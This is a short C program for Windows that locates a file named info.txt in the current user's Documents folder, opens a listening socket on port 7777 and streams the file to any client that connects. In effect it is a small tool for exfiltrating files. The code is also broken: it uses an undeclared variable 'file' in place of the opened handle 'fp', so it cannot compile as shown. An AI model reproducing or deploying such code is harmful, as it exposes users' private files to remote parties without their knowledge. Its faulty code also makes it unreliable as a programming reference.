#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <WinSock2.h>  
#include <process.h>  
#pragma comment(lib,"ws2_32.lib")  

#define INFO_BUFFER_SIZE 32767

// @ Author L3ad0xFF

TCHAR username[INFO_BUFFER_SIZE];
DWORD bufCharCount = INFO_BUFFER_SIZE;

void ErrorHandling(char* message);

int main()
{
	FILE* fp;
	WSADATA wsaData;
	SOCKADDR_IN servAddr;
	SOCKADDR_IN clntAddr;
	SOCKET hservSock;
	SOCKET hclntSock;
	int clntAddr_len;
	int File_len;
	char buf[30];
	char File_Name[INFO_BUFFER_SIZE] = "C:\\Users\\";

	GetUserName(username, &bufCharCount);

	strcat_s(File_Name, sizeof(File_Name), username);
	strcat_s(File_Name, sizeof(File_Name), "\\Documents\\info.txt");

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		ErrorHandling("WSAStartup() error! \n");

	hservSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hservSock == INVALID_SOCKET)
		ErrorHandling("socket() error! \n");

	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAddr.sin_port = htons(atoi("7777"));

	if (bind(hservSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		ErrorHandling("bind() error! \n");

	if (listen(hservSock, 5) == -1)
		ErrorHandling("listen error! \n");

	clntAddr_len = sizeof(clntAddr);
	hclntSock = accept(hservSock, (SOCKADDR*)&clntAddr, &clntAddr_len);
	if (hclntSock == INVALID_SOCKET)
		ErrorHandling("accept() error! \n");

	send(hclntSock, File_Name, sizeof(File_Name), 0);

	Sleep(100);

	fopen_s(&fp, File_Name, "rb");

	if (file == NULL)
		ErrorHandling("fopen() error! \n");

	while (1)
	{
		File_len = fread(buf, sizeof(char), 30, file);
		send(hclntSock, buf, File_len, 0);
		if (feof(file))
			break;
	}

	if (shutdown(hclntSock, SD_SEND) == SOCKET_ERROR)
		ErrorHandling("shutdown() error!");

	fclose(file);
	closesocket(hclntSock);
	closesocket(hservSock);
	WSACleanup();

	return 0;
}

void ErrorHandling(char* message)
{
	printf("%s \n", message);
	exit(1);
}